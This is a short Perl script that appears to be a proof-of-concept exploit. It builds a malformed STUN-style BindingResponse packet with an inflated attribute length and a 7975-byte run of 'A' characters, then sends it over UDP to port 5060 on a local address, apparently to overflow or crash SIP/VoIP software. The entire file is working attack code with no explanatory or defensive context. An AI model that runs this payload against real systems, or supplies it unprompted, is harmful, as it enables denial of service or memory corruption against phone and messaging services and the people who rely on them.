#!/usr/bin/perl
 

use IO::Socket::INET;

my $buf = join("", "\x01\x01", # BindingResponse
    "\x00\x01", # MsgLength
    "A"x16, # GUID
    "\x00\x00", # Attribute
    "\x08\x01", # AttrLength
    "A"x7975 # Value
   );

my $remote = IO::Socket::INET->new( Proto => 'udp',
         PeerAddr => '192.168.1.49',
         PeerPort => 5060);

print $remote $buf;

